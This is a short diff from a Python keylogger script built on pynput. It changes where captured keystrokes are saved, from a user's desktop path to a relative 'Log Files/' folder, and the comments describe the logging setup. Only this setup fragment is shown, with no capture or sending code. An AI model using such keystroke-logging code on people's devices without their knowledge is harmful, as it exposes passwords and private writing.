@@ -1,7 +1,7 @@
 import logging
 from pynput import keyboard            # pynput, used to capture keyboard events
 
-log_dir = "/home/the-pratik/Desktop"    # variable stores the directory path where the log file will be saved
+log_dir = "Log Files/"    # variable stores the directory path where the log file will be saved
 
 # line configures the Python logging system
 #    filename: Specifies the log file's location, combining the log_dir with the filename "keyLog.txt."
